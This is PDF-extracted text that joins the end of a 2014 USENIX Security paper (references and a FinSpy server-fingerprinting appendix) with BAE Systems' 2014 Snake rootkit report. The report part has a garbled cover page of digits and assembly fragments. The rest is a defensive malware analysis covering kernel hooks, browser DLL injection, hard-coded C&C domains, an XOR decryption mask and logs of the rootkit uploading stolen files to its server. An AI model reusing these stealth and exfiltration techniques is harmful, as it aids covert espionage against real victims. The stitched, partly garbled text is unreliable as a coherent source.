[ 58 ] V. Silver , “ Spyware Leaves Trail to Beaten                            2014 . [ Online ] . Available : https://github.com / alor / em-
Activist Through Microsoft Flaw , ” 2012 , ac-                           http - server
cessed :      14-November-2013 . [ Online ] . Available :
[ 79 ] SophosLabs , “ Anatomy of a targeted attack—
http://bloom.bg/1ja2geI
SophosLabs explores an Adobe zero - day “ malware
[ 59 ] B. Hubbard , “ Emirates Balk at Activism in Region                      experiment ” , ” 2013 , accessed 7-August-2013 . [ Online ] .
Hit by Uprisings , ” 2013 , accessed : 14-November-2013 .                  Available : http://bit.ly/HQ1oRc
[ Online ] . Available : http://nyti.ms/I4n2Aw
[ 80 ] K. Zetter , “ American Gets Targeted by Digital
[ 60 ] “ SPY NET , ” accessed : 27-February-2014 . [ Online ] .                      Spy Tool Sold to Foreign Governments , ” 2013 ,
Available : http://newspynetrat.blogspot.com/                          accessed :       14-November-2013 . [ Online ] . Available :
[ 61 ] “ Asprotect SKE , ” accessed : 27-February-2014 . [ Online ] .                http://wrd.cm/1fHonth
Available : http://www.aspack.com/asprotect32.html                [ 81 ] M. Marquis - Boire and B. Marczak , “ From Bahrain
[ 62 ] “ Unpacking VBInject / VBCrypt / RunPE , ” 2010 , ac-                         With Love : FinFisher ’s Spy Kit Exposed ? ”               Jul.
cessed :          7-August-2013 . [ Online ] . Available :                   2012 , accessed : 4-August-2013 . [ Online ] . Available :
http://bit.ly/1e28nS2                                                 http://bit.ly/1bngpB2
14
524    23rd USENIX Security Symposium 	                                                                            USENIX Association
A      FinSpy fingerprints
Previous work by Guarnieri on scanning for FinSpy servers
found that in response to a request such as GET / , the
Bahraini FinSpy C&C server returns a response with the string
“ Hallo Steffi ” [ 67 ] . Guarnieri searched a database of
such responses compiled by the Critical . IO Internet scanning
project [ 68 ] , locating 11 additional servers in 10 countries [ 67 ] .
We refer to this fingerprint as α1 . Concurrent with this ef-
fort , we devised our own fingerprint β1 that tested three as-
pects of the handshake between a FinSpy infectee and a Fin-
Spy C&C server , which follows a custom TLV - based protocol
running on ports such as 22 , 53 , 80 , and 443 . We conducted
targeted scanning of several countries using β1 , and also con-
firmed Guarnieri ’s findings for those servers still reachable af-
ter he published his findings .
We observed a trend : changes in HTTP response behavior
by FinFisher after publication of findings about the software .
In July 2012 , for example , after a post about Bahraini FinSpy
samples [ 81 ] , servers closed the TCP connection in response
to a GET / or HEAD / request ( although servers continued
to behave consistently with β1 . Other changes followed later
in 2012 , including a new response to GET / requests that in-
cluded an imperfect copy of an Apache server ’s HTTP response
( the Date header used UTC rather than GMT ) . We fingerprinted
this error as α2 , and later in 2012 fingerprinted other distinctive
behavior in response to GET / requests as α3 .
Subsequent scans of /0 for α2 and α3 , and five service
probes of the Internet Census for α1 through α3 , located several
additional servers . In Feburary 2013 we identified and finger-
printed new HTTP response behavior with α4 and modified β1
to produce β2 , which tests only two of the three aspects of the
FinSpy handshake ( the third test of β1 was broken when Fin-
Spy servers were updated to accept types of invalid data they
had previously rejected ) .
As of 3/13/13 , all servers that matched any α fingerprint
matched β2 .
15
USENIX Association 	                                                         23rd USENIX Security Symposium    525

1 1 1 1 1 0                                             1
11 010 110 00 00 00 01 10 011 011 110 010 010 10 1
1 1 1 0                                                 0
01 010 101 10 00 10 01 01 101 100 101 101 110 01
1    0     0      0                                         1
11 010 010 10 01 01 01 01 100 101 011 100 001 01
1 1 1 1                                                  0
11 0 0 0 0 00 01 10 00 01 00 11 01 01
1       1      1     01 10 10 1
SNAKE CAMPAIGN
& CYBER ESPIONAGE TOOLKIT
1
00 010 101 10 10 11 10 10
1 0 1
01 10 101 10 01 10 0
0     0 0 0 10 11
10 11 10 0 10 1
10 00 01 0 10
01 011 001 10 10
0
01 01 01 1
3E } > ’,0
11 001 010 11
, 0
1 1 0 1
$
10 101 001 01
lad
0 1 1 1
10 101 010 00
01 010 101 01
9
7 - 59 8:19Z v
6
1 0 0
D
01 101 101 01
A
FD9F
0 0 1 1
11 01 00 00
01 01 01 01 1
10:2
01 01 11 01 10
01 11 01 01 00 1
01 10 10 01 01 10
01 10 10 01 01 10 0
1
A3B- 7 - 01 - 04
6
01 10 01 01 10 00 01
A
11 10 01 01 10 01 01 10
-
459b
00 01 11 1 01 11 10 10
1       0
11 101 101 00 11 01 00 10 100 010
0
1      1 1 1
10 010 010 10 10 10 10 10 001 10
4 20
1 0 0 1
11 01 01 0 1 0 0 01 10 0
1     1      1     00 01 01 1 0 1
10 10 10 01 10 01 01 10 010 0
9
\{B9 g.c 520
0     0
-
shor t abyBu ed_DLL
1      1      1      0
01 101 101 01 10 10 11 10 101 0
lt ]
D 5
0      0      1 0
10 010 101 01 10 10 11 00 101
3DFE
Resu
ffer
1       0 0 1
01 011 101 00 10 01 10 00 010
fic
AF
fi
pt
AA
1 0 1 1
01 01 01 0 1 1 0 01 0
_ con
1      1       0     10 10 11 0 1
edx pt_traf
shor [ ebp+dw
eax , _ DEADBE
offs t Encry
_
11 10 101 01 10 01 01 10 10
off pt_XOR
0
eax , exit
flag , exit
0      0     1 0
01 010 101 01 01 01 10 10
s
edob BaseNam : snake
decr eax
t
esp
1      0 0 0
11 011 101 00 01 11 10 10
je c
ebp , 0
1 0 0 0
11 01 01 0 1 1 1 10
y
t
t
e
e
y
1      1       0     10 01 00 0
eax ,
edOb
s
r
01 10 01 01 01 10 01 0
near p
c                                                            0       1
‘ $ I d
eb
de                                                                                           0      1
0     1
01 010 101 01 01 11 10
1     0      0 0
11 011 101 00 01 10 01
1      1 1
01 101 101 00 01 10 10
:
g db
push
call
test
ject
proc
sh
h
h
call
1 0 0
11 10 01 1 1 1 0
mov
mov
cmp
mov
p
jnz
s
s
0       1      0    01 00 01
jz
u
m
pu
pu
01 010 101 01 01 01 0
\
fi
p
c
aBas de 0 , <
n
1      0 1
01 011 101 00 01 10
o
L
_ c
L
1 0 0
01 01 01 0 0 1
t_D
1       1     0    11 10
m
nake
11 010 101 01 00 10
n a
p
1 0
e                                                                                                   11 10 101 11 01 10
o
y
0
c
aIdS
r
0     0
01 011 100 01 01 0
i
dec
un
0     1
01 101 101 01 10
0 0
11 10 01 0 1
2A
2D
E
: 000 9631
32
37
39
3B
004 3E
B8
8
: 000 482C
A0
A0
A1
003 A3
AA
AC
1
: 000 81B6
0      1      1    10
49 2
14 B
38 B
01 010 100 00 10
.tex : 000496
6
6
.tex : 000496
.te : 000496
6
6
.tex : 000496
... : 000147
7
... : 000381
1
1
.tex : 000381
.tex : 000381
1
1
.te : 00049
.te : 00049
9
.te : 00038
8
.te : 00038
0
01 011 101 01 10
04
01
03
0
0
11 010 110 01 0
t:00
t:00
t:00
t:00
0
0
1
01 10 00 0
:
:
0      1     1
t
t
t
t
t
t
t
t
t
t
t
t
t
t
t
t
t
0
x                                                                                                               10 011 010 01
x
x
x
x
x
.tex
x
x
.tex
x
x
x
x
x
.tex
e
e
e
e
e
e
e
e
0
10 011 011 01
.t
.t
.t
.t
.t
.t
.t
.t
10 011 001 01
EXECUTIVE
SUMMARY
BAE Systems Applied Intelligence : Snake Rootkit Report 2014    2
OVERVIEW
One of the questions which comes up in the months after big security whitepaper disclosures is :
where are they now ? In other words , what happened to the operators , tools , and infrastructure
which was revealed in the reports , blog - posts , and press interviews .
Did they continue on as before , did they re - build the disclosed infrastructure and tools , did they go
away and get jobs in another line of work ?
In some cases , the disclosure had little , if any impact on the operation . For example , after the
McAfee ShadyRAT report in 2011 , there was absolutely no change in the attacks from the group
behind this . However , when Mandiant released their APT1 report in 2013 , there was a noticeable
reduction in activity from the group – and much of the tools and infrastructure has not been seen
since .
In the September 2010 issue of Foreign Affairs magazine1 , former US Deputy Secretary of Defense
William J. Lynn discussed a cyber - attack which happened two years previously on the DoD ’s
classified computer networks . Lynn described how a foreign intelligence agency planted malicious
code on the networks with the aim of transferring data to servers under their control .
The article included the now oft - quoted phrase ‘ digital beachhead’ to describe what was
undoubtedly a significant compromise of US military systems . Further reports in the press2 kept the
story alive in 2011 , but since then this threat has received remarkably little attention .
However , the operation behind the attacks has continued with little modification to the tools and
techniques , in spite of the widespread attention a few years ago . They use highly sophisticated
malware tools to maintain persistent access to their targets . These tools can be used for covert
communications in a number of different modes , some of which present significant challenges for
traditional security technologies to detect .
There are some threats which come and go , whilst there are others which are permanent
features of the landscape . In this paper , we describe the tools and techniques of one of the most
sophisticated and persistent threats we track . We hope this will help victims identify intrusions and
understand their need to improve defences . Cyber security is a collaborative effort – the operation
described in this paper again raises the bar for the security community in their efforts to keep up
with the attackers in cyber - space
1
http://www.foreignaffairs.com/articles/66552/william-j-lynn-iii/defending-a-new-domain
2
http://www.reuters.com/article/2011/06/17/us-usa-cybersecurity-worm-idUSTRE75F5TB20110617
BAE Systems Applied Intelligence : Snake Rootkit Report 2014    3
TECHNICAL
DESCRIPTION
BAE Systems Applied Intelligence : Snake Rootkit Report 2014    4
BACKGROUND
When antivirus back - end classification platforms can not identify a malware family for an analysed malicious sample , they assign
generic names , such as “ Trojan Horse ” or “ Agent ” . The variant letters are also assigned automatically , by using hexavigesimal
( or Base26 ) notation . That is , the variant letters are auto - assigned starting from “ A ” , followed with “ B ” , and so on until “ Z ” . Next
comes “ AA ” , “ AB ” and so on , until “ ZZ ” . After that , the variant letters start from “ AAA ” , “ AAB ” and so on , until “ ZZZ ” .
Back in 2008 an unknown malicious file was discovered and auto - classified as “ Agent . BTZ ” , meaning it was registered as unknown
malicious sample # 1,898 in an anti - virus classification system . It was n’t given an actual name , only a generic one .
Meanwhile , internally the authors behind this malware were using their own naming systems - with specific titles for their file
components and projects such as “ snake ” , “ uroburos ” , “ sengoku ” , and “ snark “ used to denote variants of their framework .
A recent report from German security company GData3 described a sample from the “ uroburos ” variant of this framework . Their
report revealed the complex nature of this malware family , and showed that the operation behind “ Agent . BTZ ” has continued . As
a result of this disclosure , we are also releasing our own technical analysis of the threat , including a timeline of known samples ,
known Command - and - Control ( C&C ) servers , and other indicators to aid investigators in discovering attacks .
Reverse engineering of recent malware samples shows these to be much more advanced variants of Agent . BTZ , though still sharing
many similarities and encryption methods with the original . Further investigation allowed us to locate related samples compiled
between 2006 and 2014 , and spanning across several distinctive generations . The first section of this report gives an overview of
the samples collected , where they were reported and the timelines derived from their analysis .
Snake ’s architecture turned out to be quite interesting . We have identified two distinct variants , both highly flexible but with two
different techniques for establishing and maintaining a presence on the target system . In general , its operation relies on kernel
mode drivers , making it a rootkit . It is designed to covertly install a backdoor on a compromised system , hide the presence of its
components , provide a communication mechanism with its C&C servers , and enable an effective data exfiltration mechanism . At the
same time , Snake exposed a flexibility to conduct its operations by engaging these noticeably different architectures .
In the first model , the network communications are carried out from the userland - i.e. the area of the computer system where
application software executes . In another model , the network communications are handled by a kernel mode driver - i.e. the area
where lower level system code such as device drivers run . The choice of what architecture should be used may depend on a specific
target ’s environment , allowing the Snake operators to choose the most suitable architecture to be deployed .
In both architectures there is a kernel mode driver installed and a usermode DLL injected by the driver into the system processes .
In both architectures , there is both 32-bit and 64-bit code involved . In order to distinguish between these architectures , we will call
them the usermode - centric and the kernel - centric architectures respectively .
The remainder of this report gives a detailed explanation of how the two Snake architectures embed themselves in the target
system and communicate with the outside world . We have also provided a set of technical indicators in the Appendix to enable
organisations and the security research community to identify compromises .
3
https://www.gdata.de/rdk/dl-en-rp-Uroburos
BAE Systems Applied Intelligence : Snake Rootkit Report 2014                5
SNAKE SAMPLES
In total we have collected over 100 unique files related to this espionage toolkit . Many of these were submitted to online malware
analysis websites by victims and investigators over several years . In many cases the source country information of the submission
is available . These allow us to visualise the distribution of countries where this malware has been seen :
# Samples                     Submission Year
Source country 2010 2011 2012 2013 2014 Total
Ukraine              1    3      6     8    14                                    32
Lithuania                           9     2                                    11
Great Britain                       4                                          4
Belgium                             2                                          2
Georgia                                  2                                     2
United States            1      1                                               2
Romania                             1                                          1
Hungary                                  1                                     1
Italy                                    1                                     1
Total                1    4      7    24    20                                    56
Whilst this view is likely to only be the tip of the iceberg , it does give us an initial insight into the profile of targets for the Snake
operations .
Other useful visualisations of the operations come from the compile timestamps . Below is shown a table with a count of the
number of files in our sample set from recent years . Two samples compiled in late January 2014 show that this activity is ongoing .
# Samples by compile month
Year           01        02         03          04        05        06         07        08        09        10         11         12      Total
2006                1                                       3                                                                        4
2007                                              1                   1                                     1                         3
2008                                     2                  1          2         1                                      2               8
2009                1          1                                                1                            3          2          2 10
2010                1          1                    1                   1                                     1          2               7
2011                                     1                            4         1                            3          1          3 13
2012                2                     1                            1                                     1          2          7 14
2013                1         13           5         2         5          4         3         2         1          2          1              39
2014                2                                                                                                               2
Total               8         15           9         4         9         13         6         2         1         11         10         12 100
Plotting the day of the week in which the samples were compiled shows a now familiar pattern for analysts of modern cyber - attacks .
The creators of the malware operate a working week , just like any other professional . The single sample in our set which was
compiled on a Saturday is an outlier , but does n’t alter the conclusion . Similarly , plotting the hour of the day in which the samples
were compiled reveals another human pattern – the working day . This has been adjusted to UTC+4 to show a possible fit to the
operators’ local time .
# Samples compiled per day of the week                                                                    # Samples compiled by hour of the day
( adjusted to UTC+4 )
30
25
20
15
10
5
0
Mon       Tue       We d        Thu         Fri             Sat             Sun
BAE Systems Applied Intelligence : Snake Rootkit Report 2014                       6
USERMODE - CENTRIC ARCHITECTURE
The usermode - centric architecture of Snake is known to have been used from 2011 till 2014 , with the most recent sample compiled
on January 28 , 2014 .
With this architecture , the Snake driver is mainly used to load the DLL module into the usermode processes , and then use that
module for the communications .
One of the analysed samples exposed multiple debug messages and source control check - in logs . It is not clear why those
messages were allowed in the deployed driver - possibly an operational security lapse . However , they give some insight into the
internal structure of the source code .
For example , the analysed driver gave away the following source file names :
• 	    d:\proj\cn\fa64\common\loadlib\common / loadlib_helpers.c
• 	    d:\proj\cn\fa64\common\loadlib\win / loadlib.c
• 	    d:\proj\cn\fa64\uroboros\rk_common\libhook\common / libunhook.c
• 	    d:\proj\cn\fa64\uroboros\rk_common\libhook\ntsystem / libhook.c
• 	    d:\proj\cn\fa64\uroboros\rk_common\libhook\common / hook_helpers.c
• 	    d:\proj\cn\fa64\uroboros\rk_common\libhook\common / libhook.c
• 	    d:\proj\cn\fa64\uroboros\rk_common\libhook\common / idthook.c
• 	    .\rk_ntsystem.c
• 	    .. \common\helpers\interface_s.c
• 	    .. \k2\fa_registry.c
• 	    .. \k2\syshook.c
The source control check - in log examples , showing the names of the developers to be ‘ vlad’ and ‘ gilg’ :
• 	  $ I d : snake_config.c 5204 2007 - 01 - 04 10:28:19Z vlad $
• 	  $ I d : mime64.c 12892 2010 - 06 - 24 14:31:59Z vlad $
• 	  $ I d : event.c 14097 2010 - 11 - 01 14:46:27Z gilg $
• 	  $ I d : named_mutex.c 15594 2011 - 03 - 18 08:04:09Z gilg $
• 	  $ I d : nt.c 20719 2012 - 12 - 05 12:31:20Z gilg $
• 	  $ I d : ntsystem.c 19662 2012 - 07 - 09 13:17:17Z gilg $
• 	  $ I d : rw_lock.c 14516 2010 - 11 - 29 12:27:33Z gilg $
• 	  $ I d : rk_bpf.c 14518 2010 - 11 - 29 12:28:30Z gilg $
• 	  $ I d : t_status.c 14478 2010 - 11 - 27 12:41:22Z gilg $
It also exposed the project name of this particular variant as ‘ sengoku’ :
d:\proj\cn\fa64\sengoku\_bin\sengoku\win32_debug\sengoku_Win32.pdb
Now it ’s time to execute the driver and see what it does .
BAE Systems Applied Intelligence : Snake Rootkit Report 2014         7
ROOTKIT EXECUTION
When first executed , the driver creates device named \Device\vstor32 with a symbolic link \DosDevices\vstor32 .
This device is used for userland / kernel communications .
Next , it drops a DLL into the % windows% directory - the DLL is carried in the body of the driver as a binary chunk with
XOR 0xAA applied on top of it , so the driver decrypts it first .
Depending on the variant , the DLL is dropped either under a random name or a hard - coded name , such as mscpx32n.dll .
The purpose of this DLL is to be injected into the user - mode processes . Some variants of Snake carry the DLL modules that can be
installed as a service , to be run within taskhost.exe or services.exe processes .
Next , the driver sets up the hooks for the following kernel - mode APIs :
• 	  ZwCreateThread
• 	  ZwCreateUserProcess
• 	  ZwShutdownSystem
After that , it calls PsSetCreateProcessNotifyRoutine ( ) in order to be notified whenever a new process is started .
The handlers of the hooks above along with the notification callback allow Snake to stay persistent on a system , being able to infect
any newly created processes , and restore its driver file in case it gets deleted .
Another set of hooks it sets is designed to hide the presence of the Snake components on the system :
• 	  ZwQuerySystemInformation
• 	  ZwQueryInformationProcess
• 	  ZwClose
• 	  ZwTerminateProcess
The driver then watches for all userland processes to see if they load any web pages .
As long as the user is not using the Internet , Snake stays dormant too , as there is no process that communicates with the web
servers .
However , as soon as the user goes online , the driver intercepts that event and then immediately injects the malicious DLL module
into the process that initiated connection ( the browser ) .
Once injected , the module initiates polling from one of the hard - coded C&C servers .
The purpose of this behaviour is to blend Snake ’s traffic with the browser traffic , bypassing the firewalls , and keeping a low profile
at the same time . By communicating from within a process that also communicates , even a technically savvy user will find it
challenging to detect Snake traffic among legitimate traffic .
The reason behind such difficulty is because modern web pages often fetch pages from the different web servers , including such
data as additional scripts , CSS templates , advertising contents , analytics data , blogs , social networking data , etc . When intercepted
with the purpose of analysis , such traffic may literally represent itself hundreds of DNS and HTTP requests made when a popular
website , such as a news website is open .
Hiding a few DNS / HTTP requests among busy network traffic allows Snake rootkit to stay unnoticed .
In order to test Snake ’s communications with the C&C servers , and still being able to clearly distinguish its traffic , a small tool was
built to generate GET request to a web server running on the analysed system .
The tool was named as chrome.exe in order to trigger the malware communications .
BAE Systems Applied Intelligence : Snake Rootkit Report 2014                8
COMMAND - AND - CONTROL COMMUNICATIONS
As long as the test tool named chrome.exe did not make any requests , its memory stayed pristine . There were no injections made
by the driver .
As soon as the tool made its first GET requests , the driver immediately injected a malicious DLL module in it , and that module
started producing the following traffic :
No .    Time            Source                Destination          Protocol Length Info
38    44.290689000    192.168.202.131       192.168.202.2        DNS    77 Standard query 0x6ad3 A winter.site11.com
41    44.292830000    192.168.202.2         192.168.202.131      DNS    93 Standard query response 0x6ad3 A 31.170.161.136
45    44.518185000    192.168.202.131       31.170.161.136       HTTP 219 GET /D / pub.txt HTTP/1.1
47    44.743999000    31.170.161.136        192.168.202.131      HTTP 474 HTTP/1.1 302 Found ( text / html )
↓
84    45.990199000    192.168.202.131       31.170.161.136       HTTP      233     GET /D/1/f42cce984070b8ab1c0 HTTP/1.1
86    46.216079000    31.170.161.136        192.168.202.131      HTTP      474     HTTP/1.1 302 Found ( text / html )
94    46.525887000    192.168.202.131       31.170.164.249       HTTP      217     GET / ? HTTP/1.1
101    46.939359000    192.168.202.131       192.168.202.2        DNS        82     Standard query 0x5ae5 A swim.onlinewebshop.net
102    46.940914000    192.168.202.2         192.168.202.131      DNS        98     Standard query response 0x5ae5 A 83.125.22.197
107    47.287205000    192.168.202.131       83.125.22.197        HTTP      224     GET /D / pub.txt HTTP/1.1
109    48.219805000    83.125.22.197         192.168.202.131      HTTP      330     HTTP/1.1 200 OK ( text / html )
↓
118    48.813394000    192.168.202.131       192.168.202.2        DNS    82 Standard query 0x5362 A july.mypressonline.com
119    48.814837000    192.168.202.2         192.168.202.131      DNS    98 Standard query response 0x5362 A 83.125.22.197
123    49.131675000    192.168.202.131       83.125.22.197        HTTP 224 GET /D / pub.txt HTTP/1.1
125    49.780323000    83.125.22.197         192.168.202.131      HTTP 330 HTTP/1.1 200 OK ( text / html )
↓
137    50.536285000    192.168.202.131       31.170.161.136       HTTP      220     GET /D/77568289 HTTP/1.1
139    50.762073000    31.170.161.136        192.168.202.131      HTTP      474     HTTP/1.1 302 Found ( text / html )
147    51.101706000    192.168.202.131       31.170.164.249       HTTP      217     GET / ? HTTP/1.1
154    51.548661000    192.168.202.131       83.125.22.197        HTTP      225     GET /D/77568289 HTTP/1.1
163    52.014730000    192.168.202.131       83.125.22.197        HTTP      225     GET /D/77568289 HTTP/1.1
165    52.637958000    83.125.22.197         192.168.202.131      HTTP      679     HTTP/1.1 200 OK ( text / html )     ↓
Received command
The domain names of the C&C servers it relies on are hard - coded in the body of the malware . Some examples are given below , and
a full list of known domains is given in the Appendix D :
• 	  north-area.bbsindex.com
• 	  winter.site11.com
• 	  swim.onlinewebshop.net
• 	  july.mypressonline.com
• 	  toolsthem.xp3.biz
• 	  softprog.freeoda.com
• 	  euassociate.6te.net
As seen in the traffic dump above , the malware first resolves the domain name of its C&C.
Next , it fetches a file /D / pub.txt , and expects the server to respond with a string “ 1 ” , acknowledging it ’s active :
03:52:06 1336 : Connect swim.onlinewebshop.net                     type(0 ) ... OK
03:52:06 1336 : GET /D / pub.txt
03:52:07 1336 : Http status : 200
03:52:07 1336 : recv 1/1
03:52:07 DownLoad 1 command(s )
Once acknowledged , it asks the server for a command , and the server returns a new command to execute :
03:52:11 1404 : Connect swim.onlinewebshop.net                     type(0 ) ... OK
03:52:11 1404 : GET /D/77568289
03:52:12 1404 : Http status : 200
03:52:12 1404 : Command for all
03:52:12 1404 : recv 346/346
03:52:12 Command Id:303149772662877808(130201837456870000)[13:42:25 05/08/2013 ]
BAE Systems Applied Intelligence : Snake Rootkit Report 2014         9
The command it receives from C&C above ( swim.onlinewebshop.net ) is encrypted . In order to decrypt it , the malware first
applies the XOR mask to the bytes that start from offset 0x40 :
1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6 g
s923HL34x2f5cvd0fk6c1a0s
An identical XOR mask was also used by Agent . BTZ .
Next , it calculates and confirms a CRC32 checksum within the command , further decrypts the data by using the Number Theory
Library ( NTL ) , and makes sure the command is destined to the current host by matching the ID field in it .
0     1     2     3     4     5     6     7     8      9     A     B     C     D     E     F     0123456789ABCDEF
00000000     74    E4    7E    F4    9E    8E    D8    65    B3     06    EB    B3    08    EA    3E    84    t.~ .... e ...... >.
00000010     D5    A1    D2    ED    5D    0C    89    91    65     DE    4E    B6    0C    E2    2C    39    .... ] ... e . N ... ,9
00000020     A9    8A    3D    B9    0B    C0    E6    12    E9     F9    81    0A    CF    C3    D9    0C    .. = .............
00000030     5A    6A    15    B4    00    00    00    00    01     00    00    00    00    00    00    00    Zj ..............
00000040     31    64    4D    33    75    75    34    6A    37     46    77    34    73    6A    6E    62    1dM3uu4j7Fw4sjnb
00000050     13    3D    D4    DA    90    F4    BA    35    1C     36    4A    79    69    96    B1    D4    .= ..... 5.6Jyi ...
00000060     D8    F1    07    6F    7B    CC    C4    68    9D     B7    86    3E    4B    6F    BA    FB    ... o{ .. h ... >Ko ..
00000070     6E    AB    7B    29    32    FD    7C    75    B9     DF    7F    C0    0C    81    2D    14    n.{)2.|u ...... - .
00000080     23    F9    A4    DF    D3    F1    18    97    4D     CD    71    D0    52    D6    A2    E9    # ....... M.q . R ...
00000090     FF    58    30    3D    A8    8A    DD    4D    3F     DB    AE    9A    F5    07    3B    21    .X0= ... M ? ..... ; !
000000A0     67    5A    34    22    AD    60    CB    DD    A4     E2    B5    77    A1    6A    4C    2E    gZ4”.` ..... w.jL.
000000B0     C8    75    91    01    CA    5B    B3    28    3E     55    C8    68    B2    2C    40    E4    .u ... [.(>U.h.,@.
000000C0     02    A9    64    8B    80    BD    0E    AB    58     25    00    40    6E    AB    DD    5B    .. d ..... X%.@n .. [
000000D0     D1    0A    32    AE    4A    E2    60    79    BE     47    10    AE    73    35    4C    65    .. 2.J.`y . G .. s5Le
000000E0     06    3C    AA    D8    F0    49    52    DB    22     A5    0D    7B    2B    4D    8A    D1    .< ... IR.” .. {+M ..
000000F0     21    5C    62    11    E6    13    E2    CA    AF     A5    4F    5A    9E    1C    AF    AE    ! \b ....... OZ ....
00000100     C4    1C    36    4D    A0    E4    72    3A    CD     07    A3    01    AE    E6    0A    84    .. 6M .. r : ........
00000110     D4    8B    03    FB    0D    68    19    FD    86     71    8E    FD    FC    2D    C3    5C    ..... h ... q ... -.\
00000120     49    A4    E3    40    9B    77    16    BA    86     4A    DD    0D    15    7D    B1    BD    I .. @.w ... J ... } ..
00000130     A9    54    C3    F6    E4    05    72    B1    E6     B7    A5    A7    31    CE    29    8B    .T .... r ..... 1 . ) .
00000140     EF    95    58    2A    2E    48    0E    7A    BD     B8    B7    CE    48    32    E2    48    .. X*.H.z .... H2.H
00000150     2E    E2    94    65    F0    19    FC    F5    ED     1B                                  ... e ......
↓ Traffic is decrypted
0     1     2     3     4     5     6     7     8      9     A     B     C     D     E     F     0123456789ABCDEF
00000000     49    44    33    30    33    31    34    39    37     37    32    36    36    30    38    34    ID30314977266084
00000010     37    38    30    38    23    30    36    20    26     6D    61    72    6B    65    74    70    7808#06 & marketp
00000020     6C    61    63    65    2E    73    65    72    76     65    68    74    74    70    2E    63    lace.servehttp.c
00000030     6F    6D    26    2F    55    50    44    41    54     45    2F    26    63    65    72    74    om&/UPDATE/&cert
00000040     31    30    32    34    26    55    6E    37    37     6B    6F    23    73    26    26    26    1024&Un77ko#s & & &
00000050     0A                                                                                .
Once decrypted , the malware interprets the received command , as reflected in the malware log below ( the new C&C server address
is highlighted in it ) :
03:52:12 Del after 0
03:52:12 Run instruction : 6 ID:303149772147483647(13:41:34 05/08/2013 )
03:52:12 Add address & marketplace.servehttp.com&/UPDATE/&cert1024&Un77ko#s & & &
03:52:12 Finish run instruction .
After that , the malware connects to the new C&C , asking it for another command :
03:52:13 1400 : Connect marketplace.servehttp.com                               type(0 ) ... OK
03:52:13 1400 : GET /IMAGE / pub.html
03:52:15 1400 : Http status : 200
03:52:16 1400 : recv 1/1
03:52:16 DownLoad 1 command(s ) .
BAE Systems Applied Intelligence : Snake Rootkit Report 2014    10
The command it receives is called UpLoad , so it uploads all the collected logs to the server , and then cleans out those logs :
03:52:16 UpLoad : http upload 4 file(s ) .
03:52:17 652 : Connect marketplace.servehttp.com                        type(0 ) ... OK
03:52:17 652 : GET test file /IMAGE / pub.html
03:52:17 652 : POST /IMAGE/2/55198739672286404661840843638320033
03:52:18 652 : C:\WINDOWS\$NtUninstallQ812589$\gstat32.bin 310[B ]
03:52:19 652 : Http Status:200
03:52:19 652 : POST /IMAGE/2/32773318678423920155243775957661252
03:52:19 652 : result.xml 1278[B ]
03:52:20 652 : Http Status:200
03:52:21 652 : POST /IMAGE/2/41535327538451061594793127961089611
03:52:21 652 : C:\WINDOWS\$NtUninstallQ812589$\mtmon32.sdb 655[B ]
03:52:22 652 : Http Status:200
03:52:22 652 : POST /IMAGE/2/35192812459183876172895945534862460
03:52:22 652 : C:\WINDOWS\$NtUninstallQ812589$\mtmon.sdb 748[B ]
03:52:23 652 : Http Status:200
The files it uploads are stored inside its home directory % windows%\$NtUninstallQ[random]$ ,
where [ random ] is a random number .
For example , Snake ’s home directory could be C:\WINDOWS\$NtUninstallQ812589$.
The files within that directory are used by the rootkit to store configuration and log data .
When decrypted with the same XOR key that was used by Agent . BTZ , these files expose the following contents :
• 	  mtmon.sdb - C&C communication log that looks as the logs shown above .
• 	  mtmon_.sdb - installation log , that shows infected processes ( Internet Explorer ) , the random name of the dropped DLL
( e.g. kbdfaori.dll ) , log directory , and the registry entry ShellCore that stores other configuration details :
03:52:02 TVer=1.2
03:52:02 Parent : C:\Program Files\Internet Explorer\IEXPLORE.EXE
03:52:02 ver 3.2.0.0a inj              dll K:0       PID:712 ,
C:\WINDOWS\system32\kbdfaori.dll ,
hostID : ea5cfa5ea1681bd6(16887647987074341846 )
03:52:02 C:\WINDOWS\$NtUninstallQ812589 $ ,
Temp : C:\WINDOWS\$NtUninstallQ812589$\SPUNINST\Temp
03:52:02 REG : Software\Microsoft\Windows\CurrentVersion\ShellCore
03:52:02 ModuleStart : 03:51:42
• 	  scmp.bin - pipe server log that shows its assigned name ( COMPUTERNAME is the name of the test system ) and
what processes it operates from :
02:04:24 TVer=1.6
02:04:24 SPCOMPUTERNAME : Pipe server thread start
02:04:24 Inj[1620]:explorer.exe
03:51:42 Inj[712]:iexplore.exe
• 	  ucmp.bin - another pipe server log :
02:04:44 TVer=1.6
02:04:44 UPCOMPUTERNAME : Pipe server thread start
BAE Systems Applied Intelligence : Snake Rootkit Report 2014     11
INTER - PROCESS COMMUNICATIONS
Analysis of the sample reveals that it supports 3 modes of fetching C&C commands .
• 	    In the first mode , it relies on Windows Internet ( WinINet ) APIs , such as HttpOpenRequest ( ) , HttpSendRequest ( ) ,
InternetReadFile ( ) , etc .
• 	    In the second mode , it uses Windows Sockets 2 ( Winsock ) APIs , such as WSAStartup ( ) , socket ( ) , connect ( ) ,
send ( ) , etc .
• 	    In the third mode , it works in the ‘ pipe server’ mode , when it passes the web requests it is interested in ( as a client ) to the
pipe server that runs within Windows Explorer ( explorer.exe ) and/or Internet Explorer ( iexplore.exe ) processes .
Memory pipes is a common mechanism for Inter - Process Communications ( IPC ) . When the pipe server reads such requests from the
pipes , it performs the web request on behalf of a client by using WinINet APIs , so it effectively serves as a proxy .
The diagram below demonstrates the last , ‘ pipe server’ mode of Snake operation :
Injected Snake DLL                System Process
( e.g. services.exe )
Snake DLL                     Internet
3                  in ‘ pipe server’
mode
4
3
Legitimate Process
Injected Snake DLL
( e.g. a browser )
User Mode
2
1
Kernel Mode
Legitimate Process
( e.g. a browser )
2
Embedded
Snake ’s Kernel Mode                                           DLL Module
Driver , with the DLL
module embedded in it
The diagram illustrates the operation steps 1 - 4 :
1      First , the malicious driver with the embedded DLL module injects that DLL into a system process ,
such as services.exe ; once loaded , the DLL will function in the ‘ pipe server’ mode .
As soon as the driver detects a usermode process that goes online ( e.g. a browser ) , it will inject malicious DLL module
2      into it ; depending on the operational mode , the DLL may start communicating with C&C directly .
In the ‘ pipe mode’ of operation , the injected DLL will start communicating with the pipe server by sending messages into
3      the established inter - process communication pipes .
Once the task of communication with C&C is delegated to the pipe server , it will start communicating with the C&C ,
4
bypassing the host - based firewalls that keep an infected system process in a white - list .
